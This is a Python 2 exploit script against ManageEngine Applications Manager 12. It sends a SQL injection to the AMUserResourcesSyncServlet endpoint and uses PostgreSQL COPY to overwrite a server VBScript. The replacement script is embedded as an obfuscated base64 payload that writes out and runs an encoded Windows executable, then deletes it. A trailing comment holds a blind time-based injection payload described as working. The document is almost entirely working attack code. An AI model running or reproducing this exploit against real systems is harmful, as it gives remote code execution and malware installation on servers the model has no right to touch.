import sys, requests, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# String qry = "select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=" + userId + " RESOURCEID >" + stRange + " and RESOURCEID < " + endRange;

def main():
    if len(sys.argv) != 2:
        print "Usage: %s <target>" % sys.argv[0]
        print "eg. %s target" % sys.argv[0]
        sys.exit(-1)

    t = sys.argv[1]

    payload = ''
    f = open('payload.txt','r')
    for line in f:
        payload += line

    # sqli =";copy+(select+convert_from(decode($$%s$$,$$base64$$),$$utf-8$$))to$$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\application\\scripts\\wmiget.vbs$$;--+" % payload 
    # Good --> sqli =";COPY+(SELECT+$$FUCKYOU$$)+TO+$$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\application\\scripts\\wmiget.vbs$$;--+"
    sqli =";copy+(select+convert_from(decode($$Ok9uIEVycm9yIFJlc3VtZSBOZXh0OlNldCBvYmpXYmVtTG9jYXRvciA9IENyZWF0ZU9iamVjdCgiV2JlbVNjcmlwdGluZy5TV2JlbUxvY2F0b3IiKTo6aWYgRXJyLk51bWJlciBUaGVuOldTY3JpcHQuRWNobyB2YkNyTGYgJiAiRXJyb3IgIyAiICYgICAgICAgICAgICAgIiAiICYgRXJyLkRlc2NyaXB0aW9uOkVuZCBJZjpPbiBFcnJvciBHb1RvIDA6Ok9uIEVycm9yIFJlc3VtZSBOZXh0Ojo6OlNlbGVjdCBDYXNlIFdTY3JpcHQuQXJndW1lbnRzLkNvdW50OkNhc2UgMjo6c3RyQ29tcHV0ZXIgPSBXc2NyaXB0LkFyZ3VtZW50cygwKTpzdHJRdWVyeSA9IFdzY3JpcHQuQXJndW1lbnRzKDEpOlNldCB3YmVtU2VydmljZXMgPSBvYmpXYmVtTG9jYXRvci5Db25uZWN0U2VydmVyICAgICAgKHN0ckNvbXB1dGVyLCJSb290XENJTVYyIik6OiAgICAgIDo6Q2FzZSA0OnN0ckNvbXB1dGVyID0gV3NjcmlwdC5Bcmd1bWVudHMoMCk6c3RyVXNlcm5hbWUgPSBXc2NyaXB0LkFyZ3VtZW50cygxKTpzdHJQYXNzd29yZCA9IFdzY3JpcHQuQXJndW1lbnRzKDIpOnN0clF1ZXJ5ID0gV3NjcmlwdC5Bcmd1bWVudHMoMyk6U2V0IHdiZW1TZXJ2aWNlcyA9IG9ialdiZW1Mb2NhdG9yLkNvbm5lY3RTZXJ2ZXIgICAgICAoc3RyQ29tcHV0ZXIsIlJvb3RcQ0lNVjIiLHN0clVzZXJuYW1lLHN0clBhc3N3b3JkKTo6ICAgICAgIGNhc2UgNjogICAgICAgICAgICAgICBzdHJDb21wdXRlciA9IFdzY3JpcHQuQXJndW1lbnRzKDApOiAgICAgICBzdHJVc2VybmFtZSA9IFdzY3JpcHQuQXJndW1lbnRzKDEpOiAgICAgICAgc3RyUGFzc3dvcmQgPSBXc2NyaXB0LkFyZ3VtZW50cygyKTogICAgICAgc3RyUXVlcnkgPSBXc2NyaXB0LkFyZ3VtZW50cyg0KTogICAgICAgbmFtZXNwYWNlID0gV3NjcmlwdC5Bcmd1bWVudHMoNSk6ICAgICAgIDogICAgICAgU2V0IHdiZW1TZXJ2aWNlcyA9IG9ialdiZW1Mb2NhdG9yLkNvbm5lY3RTZXJ2ZXIgICAgICAoc3RyQ29tcHV0ZXIsbmFtZXNwYWNlLHN0clVzZXJuYW1lLHN0clBhc3N3b3JkKTpDYXNlIEVsc2U6c3RyTXNnID0gIkVycm9yICMgaW4gcGFyYW1ldGVycyBwYXNzZWQiOldTY3JpcHQuRWNobyBzdHJNc2c6V1NjcmlwdC5RdWl0KDApOjpFbmQgU2VsZWN0Ojo6OlNldCB3YmVtU2VydmljZXMgPSBvYmpXYmVtTG9jYXRvci5Db25uZWN0U2VydmVyKHN0ckNvbXB1dGVyLCBuYW1lc3BhY2UsIHN0clVzZXJuYW1lLCBzdHJQYXNzd29yZCk6OmlmIEVyci5OdW1iZXIgVGhlbjpXU2NyaXB0LkVjaG8gdmJDckxmICYgIkVycm9yICMgIiAgJiAgICAgICAgICAgICAiICIgJiBFcnIuRGVzY3JpcHRpb246RW5kIElmOjpPbiBFcnJvciBHb1RvIDA6Ok9uIEVycm9yIFJlc3VtZSBOZXh0Ojo6OlNldCBjb2xJdGVtcyA9IHdiZW1TZXJ2aWNlcy5FeGVjUXVlcnkoc3RyUXVlcnkpOjppZiBFcnIuTnVtYmVyIFRoZW46V1NjcmlwdC5FY2hvIHZiQ3JMZiAmICJFcnJvciAjICIgICYgICAgICAgICAgICAgIiAiICYgRXJyLkRlc2NyaXB0aW9uOkVuZCBJZjpPbiBFcnJvciBHb1RvIDA6OjppPTA6Rm9yIEVhY2ggb2JqSXRlbSBpbiBjb2xJdGVtczppZiBpPTAgdGhlbjpoZWFkZXIgPSAiIjpGb3IgRWFjaCBwYXJhbSBpbiBvYmpJdGVtLlByb3BlcnRpZXNfOmhlYWRlciA9IGhlYWRlciAmIHBhcmFtLk5hbWUgJiB2YlRhYjpOZXh0OldTY3JpcHQuRWNobyBoZWFkZXI6aT0xOmVuZCBpZjpzZXJ2aWNlRGF0YSA9ICIiOkZvciBFYWNoIHBhcmFtIGluIG9iakl0ZW0uUHJvcGVydGllc186c2VydmljZURhdGEgPSBzZXJ2aWNlRGF0YSAmIHBhcmFtLlZhbHVlICYgdmJUYWI6TmV4dDpXU2NyaXB0LkVjaG8gc2VydmljZURhdGE6TmV4dDpGdW5jdGlvbiBEbWlyTlJGUGxLc3goR1JNa0VWTmMpOiAgICAgICAgbUF2THZQeU9KcnhHbiA9ICI8QjY0REVDT0RFIHhtbG5zOmR0PSImIENocigzNCkgJiAidXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTpkYXRhdHlwZXMiICYgQ2hyKDM0KSAmICIgIiAmICAgICAgICAgICAgICAgICJkdDpkdD0iICYgQ2hyKDM0KSAmICJiaW4uYmFzZTY0IiAmIENocigzNCkgJiAiPiIgJiAgICAgICAgICAgICAgICBHUk1rRVZOYyAmICI8L0I2NERFQ09ERT4iOiAgICAgICAgU2V0IHluYVBabVhkbnV5ID0gQ3JlYXRlT2JqZWN0KCJNU1hNTDIuRE9NRG9jdW1lbnQuMy4wIik6ICAgICAgICB5bmFQWm1YZG51eS5Mb2FkWE1MKG1Bdkx2UHlPSnJ4R24pOiAgICAgICAgRG1pck5SRlBsS3N4ID0geW5hUFptWGRudXkuc2VsZWN0c2luZ2xlbm9kZSgiQjY0REVDT0RFIikubm9kZVR5cGVkVmFsdWU6ICAgICAgICBzZXQgeW5hUFptWGRudXkgPSBub3RoaW5nOkVuZCBGdW5jdGlvbjpGdW5jdGlvbiBGckdybllGQUhkWnNQQW8oKTogICAgICAgIE5LYlR3dXVoID0gIlRWcVFBQU1BQUFBRUFBQUEvLzhBQUxnQUFBQUFBQUFBUUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBZ0FBQUFBNGZ1ZzRBdEFuTkliZ0JUTTBoVkdocGN5QndjbTluY21GdElHTmhibTV2ZENCaVpTQnlkVzRnYVc0Z1JFOVRJRzF2WkdVdURRMEtKQUFBQUFBQUFBQlFSUUFBVEFFREFDSld0L01BQUFBQUFBQUFBT0FBRHdNTEFRSTRBQUlBQUFBT0FBQUFBQUFBQUJBQUFBQVFBQUFBSUFBQUFBQkFBQUFRQUFBQUFnQUFCQUFBQUFFQUFBQUVBQUFBQUFBQUFBQkFBQUFBQWdBQVJqb0FBQUlBQUFBQUFDQUFBQkFBQUFBQUVBQUFFQUFBQUFBQUFCQUFBQUFBQUFBQUFBQUFBQUF3QUFCa0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUM1MFpYaDBBQUFBS0FBQUFBQVFBQUFBQWdBQUFBSUFBQUFBQUFBQUFBQUFBQUFBQUNBQU1HQXVaR0YwWVFBQUFKQUtBQUFBSUFBQUFBd0FBQUFFQUFBQUFBQUFBQUFBQUFBQUFBQWdBRERnTG1sa1lYUmhBQUJrQUFBQUFEQUFBQUFDQUFBQUVBQUFBQUFBQUFBQUFBQUFBQUFBUUFBd3dBQUFBQUFBQUFBQUFBQUFBQUFBQUFDNEFDQkFBUC9na1A4bE9EQkFBSkNRQUFBQUFBQUFBQUQvLy8vL0FBQUFBUC8vLy84QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUxqMDZjalkydC9aZENUMFdqSEpacmtFQWpGQ0ZZUENCQU5DNVFzOTZjV2t0aHFGTktQbE5WR2lPdTVMYlU0MG1EUnk1cWV0MHkzaG43NnlIeU1QNHN6Zis4dld6alRGTXl2bEZnK1pNRmJjSFZyM29GK3BxcXhtMUlJcjZCeDAvQjhGMTVVV1lnUVZ0KzBRYkpRMnZ6ZUZMRXVidDBmREhFcjE2VEhBclhmR1hKY1hrTFh4WXNHazhCYktNSGhQYmlrbkw5VHBleU5pYkorUXBHTjhMbUdNcGh5TERxWjFUZFdEMFV1bG5MSzNmaXByeFpWZXAxVU5JUnFSaWVlaGVrZzdTc3BXK3NEOUV6YTVPaElzMTdYaDY4bEFXU0hKUklXNG5KZG92Y3pnL2RtZEUrWHI5ME5lSWh5MC9KeUdTUThueks5Y2NUcmgrQ0ZlYjRMcHNDcHN4WFZQM0drK3ZuREg2bzF1VUV5cjJxUFBqZ3k4RVFWeEdTeWFsSVVoKzltMVJYMC9wSnJqTUM1WEZpNklMUVJZcGJyWEdlTTZZbUpybWNoV3RCMXlrZ1RZRjh0VzhRUzUzRDQ0b3ExcWtlRi9EbWhteGorRWRvWkNjVytuOCt2UU9HdDVaNkQzWk1BaUkzTGRteWZDZWhVN21TYkJFQWNIQmJxdVIzUHJ0ZkRxcU1QZGl0N2JSSzdMd1BGVUZuSEVNNGo2bVdnNGZObkgwbVpSNDNBd2R6dmEzVFJRekcrblVDNnU0Z1NpZk42S0U2M3E4dHV4SDhHdWJqQVV1VmRvMUx6Yy9KNHk3UGpCakZmQmJXVW9USGZHTW9WYnBMM0xSclZFeVpMdndMaEZtMzA4bHpxSDQzQm9YZTMyYStrZHhPRzdJNWtteWpSeDNrMCsvTGFTT25uY0FrMTlVZHBRYWFuVG1qcjE3UE0yQ2NNNkt5NnJhTk5JK1g2OEt6ZEhOakw3YVQwN3l5ZjFRd3UzUE9OZTg0R2NyWWRUelZ6VTVaUmxLdkJwVkIxOWxyOEY3L2JuR2dUaEdkWDY5RjJVL29lZDk3RTNEbURlMW1LSHU4U2JveXlycDEzdzFMb3Zub0RqMlZQTlZTNXl0dmcvMkZxbHRma1hQdXJ0eDEyeTg4RjBSdDAxNVkxR1MrcWRKY0w5YVgrTXI0czdlUHRYM2dMaGkwYzhPN2UwRTA1NFlzUEJSb2t1cWV3a3c3MnNuVm41bGtGYTNEQ3c2TFBrZVB1RUlFZ0dKQnpPQTFqRTBnd3QrN1c4clNGRnBKSU1xQUNkUVVWdHhpMk5VR2NYUzVaR3BhSmlndG5aNndSZThCOXd1bTlGZkV4REJOb01VZW1PUm9pTE5RTXRiakh4UEJCZE5NZ0tENVJ5YVY4bGRHdjhhSHFhTzhXak4vWDdDVnlIK1JWbTFkb1Z2R0FXMTlGaGNrZ2NYamtTcTRkR0RLMjBZVFA0bkJqRC93S0lJOTBWUU9xRTlmMVlPTXFEUEJJd01IM0lIcmFOT2tsMmZLaGFsaGl1cVBPbHh6aHdBaDk0NDMrdE5zZjlGTTBCbU9NRzJYcjNPSTlCR2NHWXIya1FIQVdXby96UVozTkVEWkNkZ3ZJSDdJTWRmbDNKODJlTnJxTGYrNVIvVmZiN3BIbFN1c3NZbFMrQUp6SmdYV090LzdxZ0dJcTN2UFhxd050RzdaeHIwbG5oaDl1NGxjWmc2SnFmYldBZG1idnl4Tm5yblRGa3pzVjlMdUFPUDR0MlJka3BWQ1ZxclVMTzBOczVXZXN6WGxkUTJvc2RWbGRmSDZ1NlNlZGpSczhNUmpZWTl2VnFYMHhwTFpFa0RpdGZjeXFOUVJscjZXOW55bE9uQjdrSGRTMGxTSFV6N1JBSEdOMzNIQXh0Y1VUb3VBQWpkenE2WlU3dDlrN09CalNYZ3E4QXJrcGkzWWI5ODB4eG1HUWdoYWZSTXA5K2w3OWZZckhNU2FyWnljUkUvR3JyNU0xbkRDS2lYcm9Nai8rbURkV1Z0ektZVVB1N0F2bHU0ZVhIenc2L1FOYjZSVHptL013bEZBdXBOMzRHYjFBVkdZS1k2RzZJZUN4SitKTnVJWDlReUVSUG5tS0x0cFNQb0lLdkpITHBBRi84OUNBdkUvL3BxcVNCMUd0VTR0YjdsQkt4UXlHMDRkMzRwZklWTmRnR0JWajJtdEk3eUpGUjJTaXdYMmJHT0I1ZU5NZENWWHBtS0tqUXdvMFNubjRqaVltTExJbnVFR2haK21aMlJRMzc2ZzR4OWFaNFNDUFNGYkVVL3huYWtmd2s2bi9rT1g1VHQxSTRUZmVuWHhuRkZoTks1Mkc4aC9ERTVCcjhQMmJZMmR5cG1zTUZCYmp1VmdzOTlvdHFNYWQ4RFA3TFZNRk1saXNoM2xUYjVNWmhzWW1kVlZmRExmd1poSnVscjUyTlY2THdhemF6SWxGODRzRGNjVitVTHNJUWVyMmtRbGhuRWRhRHpyNDJlNkwvbmlJQmtBQnl1MTAzTGloQUVQYzk0VFhkRk9NVkIvMU1RSVE4SFRmaVg5aTlRUTB4SXZrazU0UmdZMnJYcGdJS1gwU1ZCZ3ZIV0JuOEtDZVNXcDVlQkJrK09Xb1d6YWtqMm9CaldHeVJvUkZNY21lMnNUMWkrN0d4T29LNTBlaW9IaWQ0VXNaQUtTalZXdzZrc2s0U2NUNjZJcVlQd2RpeGNqaVVUMldpaEJxUktJdkVtTjJEZCs2dWxabC9vc0NSLzJKaEphT3d2UUF6djhBV28rc3BRU2JLZkV1dVcwT2EvWjd0cjBHMTdDVUpKc3grOEw4aXNONGtvVmJ5ZHdQL2pHcm56bWtqaGVmSlUwTDBmT3Z3bytjUkxibTlBVmJGTlJEVE5IaUc1aUhFRzU5WGg5NkZkQXZHL2ZXWFpkbHN6WVVuQTcwRUx4aThzQUkyYUdHQi9EZk1rWEZ0OW1HZGx0YmpTYVBTL0Q3SFc5aERoT2FiS2ttQ253cnczZkFMRGkwNllSOW1UeFg2VTJrTzd4SmdnVmcvWXhvZW5RaTZ0Tm1pT0VNQUtaVjhiYVBjdHo1MWJRVk5rQWd2UUNabW85dGRGamRwdGxGY08rSHdOejRVRkpDUHFIclYzbVhxZmsySFJKeG84SFVyaEhYVjA3Y1ZxdXdZYkRDeisvYjNjVjQxRVFRazQzc1lQRG9Bc3N0c2N2S3ViS1pEWk5yeGRDRGV4VU5lNXBDOFUxQXEvVVQ0TWc0eXZYTHcyVTFORGwrMnJ6QWlNbFVFbEE0ZUJZcVd1Ynlka2pqeHlsZEtLVitsQngvWmltYXJidmphV0ZxR1pvMVF2OVdDZWoxcCtLZ2FBTmlMZlBlZlJYT01HbElTdVJ1T2tqVzg5ejkxWDc1d2VHTnh1dmgwNVJpb3N4MnhFN1VqVm9HNS9XdmVWdDBzRGVRejBEbzBxNW5sK3l2RG9EeVlheXhZRitjN2lOaVZaWXUzV1h2blRHWUErMXhKREh4bzN5aGRoRUdYNElFbHk2SWxHRThOZjdNNHJ0Rk5NTmxrL1dkS0lrN1JvUkVhNGdOUWNWdG8yeG4xMytrd3NxOTdueXZad1cyOG45dmtvNGxhY3orT0c2dTd1NlcreFhHQ1dKKzhjamxVdFdrZXJCbUFaeVJDMWI3QnBPTkdpcGtqamVReklTeGc0U2ZobUFSa3d2d0tSbDlDQXBYMG1GMWEyVVgvb05LUi9aOFhtbWFYdkFFQ0ZRNjRWNXluNHhaYjZZSFo1a094TXExN3RSZ2ZHdU15b3VsVVlQZXdMcEpGQXN6R3hOc2RoTnlnNG5aUy85S2RxNTYzZVg0aHpubWl3UDhNSDJGU3NlVUNtRVlaSjBCMGptblZMY0V5K1pMblZKRjJpcXhKMXRObGpVYVBTQ2kwUlN5UXN4Y1R6S25wN1Q3N2RHajBMNWF6eFZGNktQVThraGJmZ0FNdXNBM25oaW9lNFZ5UE9ZbVhrbWNYaUJiMlFYYUZQZ3hHM0hXMWZRODk1K2xEUjRLWHVFOVhOUVRma054ci9OTjNTQ0l2amUvL1NqQWN0RVBUNisyOWZJTEIyWkNOT2FYRjJCb1BHYVdQS0NzSjhYaVE0SXNFNWdCWE9kT2JVVCtvK3l5N2IvOFlYa2RaLzdqV1NjTitwMithSGJ6RHBWMU9seTArUTFscUQvMm5LNzlzVDEzZ1Y5M1VDcVo1REFWL09VWTRDclAxMEtDZTNwZjlVblBJL3ozbkZFSTNDSTJnNjcxOWJ3RHZ5eUY5UC92NHZKK3ZSUWdYcHVLNUhoRm1PVnU3TldacXBJQVdvYjBsR2duOVh5amFKY2YzQmZ6K0oweGxGbS91VlNHS2Mva3B0UHI5dkhIYUw5R3lGbUxEQ3BqL3NDblhNbERZUlI2Y05OUGYrWEdZc0JwU1VqSjJhSWEvcTRLVmxUS3Btcy9kbnc2SUVGcDhURmVsYWFMK1BLZVM2dUxaNXRMRUdSYWJxRzhQUkFXUnVtYk5GOTVuODEzTVIvaCs1ZmZsb2ZCVWRzWTJ5R0pRNndvRW1wanM5L0xsdll2RXlKT2VOem9Va1M5NEQwS0JSZ1VTa2xEemhZOHpaVzRDNjJ4b0pPWmVMdEp1a2phUnlKS05sbzRoenRqUGlRM0JHbTRnVXVjV0RiMWhweW94NTRPb1YxdEhpYko0TFJWanp0UW1HZ2dHUkNCUEJFM29CNHRUcDU4RnBqSmpmR1NWRmp3V01aai93VjFFNmlGMDRGV2twQWREcHhRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFDd3dBQUFBQUFBQUFBQUFBRlF3QUFBNE1BQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQVFEQUFBQUFBQUFBQUFBQUFRREFBQUFBQUFBQ2NBRVY0YVhSUWNtOWpaWE56QUFBQUFEQUFBRXRGVWs1RlRETXlMbVJzYkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQVZmcDJSMUJqUlBmZ1c5L1pHWG5HYzk0c3ZnMk04dHBzZnlmc01ubDVqNVFyd2JKR2xUN3haQWhUZXdBNkttOGZoRnk4dlJnOHpsazZEZz09IjogICAgICAgIERpbSBreGtoUEl3cGdsemM6ICAgICAgICBTZXQga3hraFBJd3BnbHpjID0gQ3JlYXRlT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpOiAgICAgICAgRGltIHpuYUlxcWZGS1lzaWFTUzogICAgICAgIERpbSBOUkVPR1FqUVM6ICAgICAgICBTZXQgem5hSXFxZkZLWXNpYVNTID0ga3hraFBJd3BnbHpjLkdldFNwZWNpYWxGb2xkZXIoMik6ICAgICAgICBOUkVPR1FqUVMgPSB6bmFJcXFmRktZc2lhU1MgJiAiXCIgJiBreGtoUEl3cGdsemMuR2V0VGVtcE5hbWUoKTogICAgICAgIGt4a2hQSXdwZ2x6Yy5DcmVhdGVGb2xkZXIoTlJFT0dRalFTKTogICAgICAgIGZNV1lGUWN0ID0gTlJFT0dRalFTICYgIlwiICYgInlsZXRsV2Vlci5leGUiOiAgICAgICAgRGltIFdUTUdWemtKbFZDOiAgICAgICAgU2V0IFdUTUdWemtKbFZDID0gQ3JlYXRlT2JqZWN0KCJXc2NyaXB0LlNoZWxsIik6ICAgICAgICBCdXFseGRPR0VzU2lpID0gRG1pck5SRlBsS3N4KE5LYlR3dXVoKTogICAgICAgIFNldCBhbExGWlhVaSA9IENyZWF0ZU9iamVjdCgiQURPREIuU3RyZWFtIik6ICAgICAgICBhbExGWlhVaS5UeXBlID0gMTogICAgICAgIGFsTEZaWFVpLk9wZW46ICAgICAgICBhbExGWlhVaS5Xcml0ZSBCdXFseGRPR0VzU2lpOiAgICAgICAgYWxMRlpYVWkuU2F2ZVRvRmlsZSBmTVdZRlFjdCwgMjogICAgICAgIFdUTUdWemtKbFZDLnJ1biBmTVdZRlFjdCwgMCwgdHJ1ZTogICAgICAgIGt4a2hQSXdwZ2x6Yy5EZWxldGVGaWxlKGZNV1lGUWN0KTogICAgICAgIGt4a2hQSXdwZ2x6Yy5EZWxldGVGb2xkZXIoTlJFT0dRalFTKTpFbmQgRnVuY3Rpb246RnJHcm5ZRkFIZFpzUEFvOldTY3JpcHQuUXVpdCgwKTo$$,$$base64$$),$$utf-8$$))+to$$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\s cripts\\wmiget.vbs$$;" % payload

    r = requests.post('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, params='ForMasRange=1&userId=1%s' % sqli, verify=False)
    print r
    print r.text
    print r.headers

if __name__ == '__main__': main()

    # this payload worked->";CREATE+TEMP+TABLE+readme(content+text);--+COPY+readme+FROM+$$C:\Users\Public\offsex.txt$$;--+SELECT+CASE+WHEN(ascii(substr((SELECT+CONTENT+FROM+readme),1,1))=111)+THEN+pg_sleep(10)+end;--+"